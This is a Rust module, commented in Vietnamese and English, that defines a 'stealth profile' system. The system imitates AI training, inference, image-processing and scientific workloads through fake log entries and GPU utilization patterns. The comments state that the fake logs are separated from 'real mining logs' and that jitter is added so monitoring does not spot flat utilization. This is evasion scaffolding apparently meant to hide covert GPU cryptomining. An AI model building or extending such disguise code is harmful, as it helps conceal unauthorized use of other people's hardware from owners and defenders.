//! # Wrappers (Bọc Ngụy Trang)
//!
//! **Stealth Profile System** (Hệ thống profile ngụy trang – giả lập workload hợp pháp)
//!
//! ## Design Pattern
//!
//! **Strategy Pattern** (Mẫu chiến lược):
//! - Base trait `StealthProfile` cho tất cả profile types
//! - Mỗi profile độc lập emit logs và generate GPU patterns
//! - Background task pattern cho async log emission
//!
//! ## Architecture
//!
//! ```text
//! ┌──────────────────────────────────────────────────────────┐
//! │                 StealthProfile Trait                     │
//! │  (start, stop, emit_logs, gpu_usage_pattern, name)      │
//! └────────────────┬────────────────────────────────────────┘
//!                  │
//!     ┌────────────┼────────────┬──────────────┬────────────┐
//!     │            │            │              │            │
//! ┌───▼───┐  ┌────▼────┐  ┌────▼──────┐  ┌───▼──────────┐
//! │Training│  │Inference│  │Image Proc │  │Scientific   │
//! │Wrapper │  │Wrapper  │  │Wrapper    │  │Compute      │
//! └────────┘  └─────────┘  └───────────┘  └──────────────┘
//! ```

use anyhow::Result;
use async_trait::async_trait;
use std::time::Duration;

pub mod ai_training_wrapper;
pub mod ai_inference_wrapper;
pub mod image_proc_wrapper;
pub mod scientific_compute;

// Re-export for convenience
pub use ai_training_wrapper::AiTrainingWrapper;
pub use ai_inference_wrapper::AiInferenceWrapper;
pub use image_proc_wrapper::ImageProcWrapper;
pub use scientific_compute::ScientificComputeWrapper;

// ============================================================================
// GPU Pattern State Machine
// ============================================================================

/// **GPU Pattern State** (Trạng thái mẫu GPU – phases của workload lifecycle)
///
/// State machine theo workload lifecycle:
/// ```text
/// Idle → RampUp → Plateau → Cooldown → Idle
///   ↑_____________________________________↓
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GpuPatternState {
    /// **Idle** (Nghỉ ngơi – 0-5% GPU)
    ///
    /// System đang chờ work hoặc giữa các training runs
    Idle,

    /// **RampUp** (Tăng tốc – 10% → 70-90% GPU)
    ///
    /// Khởi động: loading model, allocating memory, warmup iterations
    RampUp,

    /// **Plateau** (Ổn định – 70-90% GPU với variance nhỏ)
    ///
    /// Main workload execution: training epochs, inference batches, processing
    Plateau,

    /// **Cooldown** (Giảm tốc – 90% → 10% GPU)
    ///
    /// Finishing: saving checkpoints, cleanup, validation
    Cooldown,
}

/// **GPU Usage Pattern** (Mẫu sử dụng GPU – định nghĩa workload behavior)
///
/// ## Design Rationale
///
/// Realistic GPU patterns cần có:
/// 1. **Phase transitions**: Ramp-up, plateau, cooldown (mimic real workloads)
/// 2. **Target utilization**: Expected GPU % trong phase hiện tại
/// 3. **Variance/jitter**: Random fluctuation (avoid flat lines = detection pattern)
/// 4. **Duration**: Thời gian ở mỗi phase
///
/// ## Usage
///
/// ```rust
/// let pattern = GpuPattern {
///     state: GpuPatternState::Plateau,
///     target_utilization: 0.85,  // 85% GPU
///     ramp_duration: Duration::from_secs(30),
///     plateau_duration: Duration::from_secs(600),  // 10 min
///     cooldown_duration: Duration::from_secs(20),
/// };
/// ```
#[derive(Debug, Clone)]
pub struct GpuPattern {
    /// **Current phase** (Phase hiện tại)
    pub state: GpuPatternState,

    /// **Target utilization** (Mức sử dụng mục tiêu – 0.0-1.0)
    ///
    /// - Training: 0.80-0.90 (high sustained usage)
    /// - Inference: 0.60-0.70 (bursty, lower average)
    /// - Image processing: 0.70-0.80 (medium)
    /// - Scientific: 0.85-0.95 (very high)
    pub target_utilization: f32,

    /// **Ramp-up duration** (Thời gian tăng tốc)
    ///
    /// Thời gian từ Idle → Plateau (typically 20-60s)
    pub ramp_duration: Duration,

    /// **Plateau duration** (Thời gian ổn định)
    ///
    /// Thời gian ở mức cao (typically 5-30 minutes)
    pub plateau_duration: Duration,

    /// **Cooldown duration** (Thời gian giảm tốc)
    ///
    /// Thời gian từ Plateau → Idle (typically 10-30s)
    pub cooldown_duration: Duration,
}

// ============================================================================
// StealthProfile Trait
// ============================================================================

/// **Stealth Profile Trait** (Trait profile ngụy trang – interface cho tất cả wrappers)
///
/// ## Design Pattern
///
/// **Strategy Pattern**: Mỗi concrete profile implements trait này với behavior riêng.
///
/// ## Lifecycle
///
/// 1. **Initialization**: `new()` constructor với config
/// 2. **Start**: `start()` spawns background tasks cho log emission
/// 3. **Runtime**: Background tasks emit periodic logs
/// 4. **Query**: `gpu_usage_pattern()` returns current GPU behavior
/// 5. **Shutdown**: `stop()` cleans up background tasks
///
/// ## Thread Safety
///
/// Profile MUST be `Send + Sync` vì:
/// - Background tasks chạy trên Tokio runtime
/// - ProfileManager quản lý multiple profiles concurrently
///
/// ## Example Implementation
///
/// ```rust
/// use async_trait::async_trait;
/// use anyhow::Result;
///
/// pub struct MyProfile {
///     task_handle: Option<tokio::task::JoinHandle<()>>,
/// }
///
/// #[async_trait]
/// impl StealthProfile for MyProfile {
///     async fn start(&mut self) -> Result<()> {
///         let handle = tokio::spawn(async move {
///             // Background log emission loop
///         });
///         self.task_handle = Some(handle);
///         Ok(())
///     }
///
///     async fn stop(&mut self) -> Result<()> {
///         if let Some(h) = self.task_handle.take() {
///             h.abort();
///         }
///         Ok(())
///     }
///
///     async fn emit_logs(&self) -> Result<()> {
///         // Emit fake logs
///         Ok(())
///     }
///
///     fn gpu_usage_pattern(&self) -> GpuPattern {
///         // Return current GPU behavior
///         todo!()
///     }
///
///     fn name(&self) -> &str {
///         "my_profile"
///     }
/// }
/// ```
#[async_trait]
pub trait StealthProfile: Send + Sync {
    /// **Start profile** (Khởi động profile – spawn background tasks)
    ///
    /// ## Behavior
    ///
    /// - Spawns tokio background task cho periodic log emission
    /// - Initializes internal state (epoch counter, timers, etc.)
    /// - Returns immediately (non-blocking)
    ///
    /// ## Returns
    ///
    /// - `Ok(())`: Profile started successfully
    /// - `Err(e)`: Failed to start (e.g., resource exhaustion)
    async fn start(&mut self) -> Result<()>;

    /// **Stop profile** (Dừng profile – cleanup resources)
    ///
    /// ## Behavior
    ///
    /// - Aborts background tasks (via `JoinHandle::abort()`)
    /// - Cleans up resources (memory, file handles, etc.)
    /// - Waits for graceful shutdown (with timeout)
    ///
    /// ## Returns
    ///
    /// - `Ok(())`: Profile stopped cleanly
    /// - `Err(e)`: Cleanup failed (non-critical, logged)
    async fn stop(&mut self) -> Result<()>;

    /// **Emit logs** (Phát sinh logs – generate fake log entries)
    ///
    /// ## Behavior
    ///
    /// Called periodically bởi background task.
    /// Emit logs tới `tracing` subscriber (captured by logging system).
    ///
    /// ## Log Target
    ///
    /// Use `target: "fake_<profile_name>"` để distinguish từ real mining logs:
    ///
    /// ```rust
    /// info!(
    ///     target: "fake_training",
    ///     epoch = 5,
    ///     loss = "0.342",
    ///     "Training progress"
    /// );
    /// ```
    ///
    /// ## Returns
    ///
    /// - `Ok(())`: Logs emitted successfully
    /// - `Err(e)`: Log emission failed (rare, non-critical)
    async fn emit_logs(&self) -> Result<()>;

    /// **GPU usage pattern** (Mẫu sử dụng GPU – current workload behavior)
    ///
    /// ## Purpose
    ///
    /// Provides GPU utilization target cho smoother integration.
    /// ProfileManager aggregates patterns từ all active profiles.
    ///
    /// ## Behavior
    ///
    /// Returns current phase và target utilization based on:
    /// - Elapsed time since start
    /// - Profile type (training vs inference vs etc.)
    /// - Internal state (epoch, batch, etc.)
    ///
    /// ## Returns
    ///
    /// `GpuPattern` với current state và durations
    fn gpu_usage_pattern(&self) -> GpuPattern;

    /// **Profile name** (Tên profile – identifier cho logging và debugging)
    ///
    /// ## Usage
    ///
    /// - Logging: `info!(profile = name, "Event")`
    /// - Configuration: `enabled = ["ai_training", "inference"]`
    /// - Debugging: Error messages include profile name
    ///
    /// ## Requirements
    ///
    /// - MUST be static string (no allocation)
    /// - SHOULD be lowercase with underscores (`ai_training`, not `AITraining`)
    fn name(&self) -> &str;
}
